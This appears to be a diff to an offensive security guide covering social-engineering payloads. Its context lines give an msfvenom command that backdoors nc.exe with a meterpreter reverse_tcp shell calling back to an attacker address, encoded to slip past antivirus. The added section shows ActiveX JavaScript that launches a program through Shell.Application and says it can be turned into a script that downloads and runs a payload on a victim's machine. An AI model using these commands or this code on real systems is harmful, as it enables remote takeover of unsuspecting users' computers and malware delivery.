@@ -34,8 +34,17 @@ It is however very likely that this will be picked up by a antivirus.
 msfvenom -a x86 --platform windows -x nc.exe -k -p windows/meterpreter/reverse_tcp lhost=192.168.1.101 lhost=53 -e x86/shikata_ga_nai -i 3 -b "\x00" -f exe -o ncMalicious.exe
 ```
 
-## ActiveX
+## Autodownload a malicious javascript-files
 
+Just like we can download an exe for a user to can also make that user download a javascript file. Since javascript files can execute commands on windows.
+
+```
+var oShell = new ActiveXObject("Shell.Application");
+var commandtoRun = "C:\\Windows\\system32\\calc.exe";
+oShell.ShellExecute(commandtoRun,"","","open","1");
+```
+
+This code can be modified to greate a wget-script and then download and execute a script.
 
 The most common tool for social engineering is to use Social Engineering Toolkit. SET. It comes as default in Kali. Run it like this:
 
